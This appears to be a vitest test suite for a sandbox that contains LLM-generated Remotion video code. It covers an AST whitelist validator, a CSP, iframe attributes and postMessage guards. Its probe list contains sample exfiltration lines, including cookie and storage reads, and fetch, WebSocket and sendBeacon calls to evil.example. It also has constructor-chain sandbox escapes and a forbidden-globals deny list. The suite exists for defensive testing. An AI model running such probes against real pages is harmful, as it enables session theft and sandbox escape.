import { readFileSync } from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { describe, expect, it, vi } from "vitest";
import {
  SANDBOX_ALLOWED_GLOBALS,
  validateGeneratedCode,
  type CodeViolation,
} from "@/sandbox/code-validator";
import {
  transpileGeneratedCode,
  evaluateTranspiled,
} from "@/remotion/compiler";
import {
  SANDBOX_CSP,
  buildSandboxFrameProps,
  isTrustedSandboxEvent,
  parseSandboxMessage,
} from "@/sandbox/iframe-sandbox";
import { SandboxBridge } from "@/sandbox/sandbox-bridge";
import { evaluateGeneratedComponent } from "@/sandbox/sandbox-runtime";

/**
 * Phase 4 — isolation of LLM-generated Remotion code (formerly `new Function`
 * in the main page context). These tests are the attack suite demanded by
 * prompts/phase-4: typical malicious generated code must be refused BEFORE it
 * is ever evaluated, the sandbox frame must be opaque-origin (no
 * allow-same-origin) with a no-network CSP, and the postMessage bridge must
 * only accept structured messages from the sandboxed frame itself.
 *
 * Environment note: no DOM implementation is installable without violating the
 * phase-1 dependency policy (jsdom drags undici into the tree — see
 * tests/dependency-security-policy.test.ts), so these tests exercise the pure
 * gate layers (AST validator, protocol guards, watchdog bridge, evaluation
 * gate). Browser-level enforcement (opaque origin, CSP) is platform behavior
 * and is flagged for manual review in the phase report.
 */

const BENIGN = `
const frame = useCurrentFrame();
const { fps } = useVideoConfig();
const opacity = interpolate(frame, [0, 30], [0, 1], { extrapolateRight: "clamp" });
return (
  <AbsoluteFill style={{ backgroundColor: "#101020", opacity }}>
    <Sequence from={10}>
      <Img src={staticFile("logo.png")} />
    </Sequence>
  </AbsoluteFill>
);`;

const MALICIOUS_PROBES: Array<[string, string, string]> = [
  ["document.cookie exfiltration", `const c = document.cookie; return null;`, "document"],
  ["fetch to attacker", `fetch("https://evil.example/collect", { method: "POST" }); return null;`, "fetch"],
  ["XMLHttpRequest", `const x = new XMLHttpRequest(); return null;`, "XMLHttpRequest"],
  ["WebSocket", `const w = new WebSocket("wss://evil.example"); return null;`, "WebSocket"],
  ["localStorage read", `const t = localStorage.getItem("fqmg_session"); return null;`, "localStorage"],
  ["sessionStorage read", `const t = sessionStorage.getItem("x"); return null;`, "sessionStorage"],
  ["window.parent access", `return window.parent.document.title;`, "window"],
  ["top frame access", `return top.location.href;`, "top"],
  ["opener access", `return opener.document;`, "opener"],
  ["eval", `eval("1+1"); return null;`, "eval"],
  ["Function constructor", `const f = new Function("return this"); return f();`, "Function"],
  ["dynamic import()", `import("https://evil.example/x.mjs"); return null;`, "import()"],
  ["import declaration", `import { readFileSync } from "node:fs";\nreturn null;`, "import"],
  ["with statement", `with (Math) { var x = floor(1.5); }\nreturn null;`, "with"],
  ["constructor escape", `const g = ({}).constructor.constructor("return this")(); return g;`, "constructor"],
  ["computed constructor escape", `const o = {}; const k = "constructor"; return o[k]("return this")();`, "computed-access"],
  ["global reassignment", `Math = null; return null;`, "Math"],
  ["globalThis access", `return globalThis.__pwned;`, "globalThis"],
  ["navigator.sendBeacon", `navigator.sendBeacon("https://evil.example", "x"); return null;`, "navigator"],
  ["indexedDB", `const db = indexedDB.open("x"); return null;`, "indexedDB"],
];

function violationNames(violations: CodeViolation[]): string[] {
  return violations.map((violation) => violation.name);
}

describe("phase 4: generated-code AST validator (fail-closed whitelist)", () => {
  it("accepts a benign Remotion component built only from whitelisted globals", () => {
    const result = validateGeneratedCode(BENIGN);
    expect(result.ok).toBe(true);
    expect(result.violations).toEqual([]);
  });

  it("rejects empty and unparseable code fail-closed", () => {
    expect(validateGeneratedCode("").ok).toBe(false);
    expect(validateGeneratedCode("   ").ok).toBe(false);
    expect(validateGeneratedCode("const const const;").ok).toBe(false);
  });

  it.each(MALICIOUS_PROBES)("rejects %s", (_label, code, expectedName) => {
    const result = validateGeneratedCode(code);
    expect(result.ok, `expected rejection for: ${label0(_label)}`).toBe(false);
    expect(violationNames(result.violations)).toContain(expectedName);
  });

  it("violations carry only names/kinds, never raw source snippets", () => {
    const secret = "const token = 'sk-SUPER-SECRET-VALUE'; document.cookie = token; return null;";
    const result = validateGeneratedCode(secret);
    expect(result.ok).toBe(false);
    const serialized = JSON.stringify(result.violations);
    expect(serialized).not.toContain("sk-SUPER-SECRET-VALUE");
    expect(serialized).not.toContain("document.cookie");
  });

  it("the whitelist itself never contains escape hatches", () => {
    for (const forbidden of [
      "eval",
      "Function",
      "document",
      "window",
      "globalThis",
      "fetch",
      "XMLHttpRequest",
      "import",
      "require",
      "process",
      "constructor",
    ]) {
      expect(SANDBOX_ALLOWED_GLOBALS.has(forbidden), forbidden).toBe(false);
    }
  });
});

function label0(label: string): string {
  return label;
}

describe("phase 4: compiler gate — malicious code never reaches execution", () => {
  it("compileCode is gone — the any-context evaluator no longer exists (phase 6)", async () => {
    const compiler = (await import("@/remotion/compiler")) as unknown as Record<string, unknown>;
    expect(compiler.compileCode).toBeUndefined();
    expect(typeof compiler.evaluateTranspiled).toBe("function");
    expect(typeof compiler.transpileGeneratedCode).toBe("function");
  });

  it("the sandbox data path survives the removal end-to-end", () => {
    // parent: validate + transpile (pure data)
    const prepared = transpileGeneratedCode(BENIGN);
    expect(prepared.error).toBeNull();
    // parent -> frame: a structured run message over postMessage
    const message = parseSandboxMessage({
      type: "fqmg-sandbox/run",
      transpiled: prepared.transpiled,
      width: 1920,
      height: 1080,
      fps: 30,
      durationInFrames: 90,
    });
    expect(message?.type).toBe("fqmg-sandbox/run");
    // frame: evaluation happens ONLY inside the sandbox realm
    const evaluated = evaluateTranspiled(
      (message as { transpiled: string }).transpiled,
    );
    expect(typeof evaluated).toBe("function");
  });

  it.each(MALICIOUS_PROBES.slice(0, 8))(
    "transpileGeneratedCode refuses: %s",
    (_label, code) => {
      const result = transpileGeneratedCode(code);
      expect(result.transpiled).toBeNull();
      expect(result.error).toMatch(/security policy|not allowed/i);
      expect(result.violations?.length).toBeGreaterThan(0);
    },
  );

  it("transpileGeneratedCode returns Babel output only — no component creation", () => {
    const result = transpileGeneratedCode(BENIGN);
    expect(result.error).toBeNull();
    expect(result.transpiled).toBeTruthy();
    expect(result.transpiled).toContain("DynamicAnimation");
    expect("Component" in result).toBe(false);
  });

  it("transpileGeneratedCode refuses malicious code and reports violations", () => {
    const result = transpileGeneratedCode(`document.cookie; return null;`);
    expect(result.transpiled).toBeNull();
    expect(result.violations?.length).toBeGreaterThan(0);
  });
});

describe("phase 4: sandbox frame contract — opaque origin + no-network CSP", () => {
  it("frame is sandboxed WITHOUT allow-same-origin (opaque origin)", () => {
    const props = buildSandboxFrameProps();
    expect(props.sandbox).toBe("allow-scripts");
    expect(props.sandbox).not.toContain("allow-same-origin");
    expect(props.sandbox).not.toContain("allow-top-navigation");
    expect(props.src).toBe("/preview-sandbox");
    expect(props.referrerPolicy).toBe("no-referrer");
    expect(props.allow).toBe("");
  });

  it("CSP blocks all network channels and keeps evaluation iframe-internal", () => {
    expect(SANDBOX_CSP).toContain("default-src 'none'");
    expect(SANDBOX_CSP).toContain("connect-src 'none'");
    expect(SANDBOX_CSP).toContain("object-src 'none'");
    expect(SANDBOX_CSP).toContain("base-uri 'none'");
    expect(SANDBOX_CSP).toContain("form-action 'none'");
    expect(SANDBOX_CSP).toContain("frame-ancestors 'self'");
    // 'unsafe-eval' is the deliberate isolation feature INSIDE the opaque
    // origin: the generated code runs in the sandbox realm, not the app realm.
    expect(SANDBOX_CSP).toContain("'unsafe-eval'");
    expect(SANDBOX_CSP).not.toContain("http:");
    expect(SANDBOX_CSP).not.toContain("https:");
  });
});

describe("phase 4: postMessage protocol — structured data only, sandbox-sourced", () => {
  it("parses well-formed sandbox messages", () => {
    expect(parseSandboxMessage({ type: "fqmg-sandbox/ready" })?.type).toBe("fqmg-sandbox/ready");
    expect(
      parseSandboxMessage({ type: "fqmg-sandbox/error", message: "boom" })?.type,
    ).toBe("fqmg-sandbox/error");
    expect(
      parseSandboxMessage({ type: "fqmg-sandbox/meta", durationInFrames: 90, fps: 30 }),
    ).toMatchObject({ durationInFrames: 90, fps: 30 });
  });

  it("rejects malformed, unknown, and hostile payloads", () => {
    expect(parseSandboxMessage(null)).toBeNull();
    expect(parseSandboxMessage("fqmg-sandbox/ready")).toBeNull();
    expect(parseSandboxMessage({ type: "not-sandbox" })).toBeNull();
    expect(parseSandboxMessage({ type: "fqmg-sandbox/ready", extra: () => {} })).toBeNull();
    expect(parseSandboxMessage({ type: "fqmg-sandbox/error" })).toBeNull(); // missing message
    expect(parseSandboxMessage({ type: "fqmg-sandbox/error", message: 42 })).toBeNull();
    expect(parseSandboxMessage({ type: "fqmg-sandbox/meta", durationInFrames: "90", fps: 30 })).toBeNull();
  });

  it("only trusts messages from the sandboxed frame's own opaque origin", () => {
    const fakeFrameWindow = { symbol: Symbol("frame") };
    const ok = {
      origin: "null",
      source: fakeFrameWindow,
      data: { type: "fqmg-sandbox/ready" },
    };
    expect(isTrustedSandboxEvent(ok, fakeFrameWindow)).toBe(true);
    // a real https origin can never appear: the frame is opaque-origin
    expect(
      isTrustedSandboxEvent({ ...ok, origin: "https://evil.example" }, fakeFrameWindow),
    ).toBe(false);
    expect(isTrustedSandboxEvent({ ...ok, source: { other: 1 } }, fakeFrameWindow)).toBe(false);
    expect(isTrustedSandboxEvent({ ...ok, data: { type: "nope" } }, fakeFrameWindow)).toBe(false);
  });
});

describe("phase 4: sandbox bridge — watchdog and capture channel", () => {
  it("surfaces a timeout error when the sandbox never reports ready", () => {
    vi.useFakeTimers();
    try {
      const errors: string[] = [];
      const bridge = new SandboxBridge({ timeoutMs: 1_000, onError: (m) => errors.push(m) });
      bridge.beginSession();
      vi.advanceTimersByTime(1_500);
      expect(errors).toHaveLength(1);
      expect(errors[0]).toMatch(/timeout/i);
      // a late valid message must not resurrect a dead session
      expect(
        bridge.handleSandboxMessage({ type: "fqmg-sandbox/ready" }),
      ).toBe(false);
      expect(errors).toHaveLength(1);
    } finally {
      vi.useRealTimers();
    }
  });

  it("ready cancels the watchdog; a second session restarts it", () => {
    vi.useFakeTimers();
    try {
      const errors: string[] = [];
      const bridge = new SandboxBridge({ timeoutMs: 1_000, onError: (m) => errors.push(m) });
      bridge.beginSession();
      expect(bridge.handleSandboxMessage({ type: "fqmg-sandbox/ready" })).toBe(true);
      vi.advanceTimersByTime(5_000);
      expect(errors).toHaveLength(0);
      bridge.beginSession();
      vi.advanceTimersByTime(1_500);
      expect(errors).toHaveLength(1);
    } finally {
      vi.useRealTimers();
    }
  });

  it("capture requests correlate by id and resolve with the sandbox data URL", async () => {
    const sent: Array<{ payload: unknown }> = [];
    const bridge = new SandboxBridge({
      timeoutMs: 5_000,
      onError: () => {},
      postToSandbox: (payload) => sent.push({ payload }),
    });
    bridge.beginSession();
    bridge.handleSandboxMessage({ type: "fqmg-sandbox/ready" });

    const pending = bridge.requestCapture(12);
    expect(sent).toHaveLength(1);
    const request = sent[0].payload as { type: string; frame: number; requestId: string };
    expect(request.type).toBe("fqmg-sandbox/capture-request");
    expect(request.frame).toBe(12);

    expect(
      bridge.handleSandboxMessage({
        type: "fqmg-sandbox/capture-result",
        requestId: request.requestId,
        dataUrl: "data:image/jpeg;base64,QUJD",
      }),
    ).toBe(true);
    await expect(pending).resolves.toBe("data:image/jpeg;base64,QUJD");
  });

  it("capture rejects on timeout", async () => {
    vi.useFakeTimers();
    try {
      const bridge = new SandboxBridge({ timeoutMs: 1_000, onError: () => {}, postToSandbox: () => {} });
      bridge.beginSession();
      bridge.handleSandboxMessage({ type: "fqmg-sandbox/ready" });
      const pending = bridge.requestCapture(3);
      vi.advanceTimersByTime(1_500);
      await expect(pending).rejects.toThrow(/timeout/i);
    } finally {
      vi.useRealTimers();
    }
  });
});

describe("phase 4: sandbox-runtime evaluation gate", () => {
  it("evaluates a benign component inside the injected-whitelist realm", () => {
    const result = evaluateGeneratedComponent(BENIGN);
    expect(result.error).toBeNull();
    expect(typeof result.Component).toBe("function");
  });

  it("refuses malicious code WITHOUT executing it", () => {
    const probe = `document.cookie; globalThis.__fqmg_pwned = true; return null;`;
    const result = evaluateGeneratedComponent(probe);
    expect(result.Component).toBeNull();
    expect(result.error).toMatch(/security policy|not allowed/i);
    expect((globalThis as Record<string, unknown>).__fqmg_pwned).toBeUndefined();
  });

  it("never exposes the bridge/parent handles to evaluated code", () => {
    const probe = `parent; top; return null;`;
    const result = evaluateGeneratedComponent(probe);
    expect(result.Component).toBeNull();
  });
});

describe("phase 4: CSP wiring stays in sync (next.config.js header)", () => {
  it("the /preview-sandbox header equals SANDBOX_CSP from iframe-sandbox", () => {
    const repoRoot = fileURLToPath(new URL("..", import.meta.url));
    const config = readFileSync(path.join(repoRoot, "next.config.js"), "utf8");
    // every directive line of the module constant must appear in the config
    for (const directive of SANDBOX_CSP.split("; ")) {
      expect(config, `missing CSP directive: ${directive}`).toContain(directive);
    }
    expect(config).toContain('source: "/preview-sandbox"');
  });
});
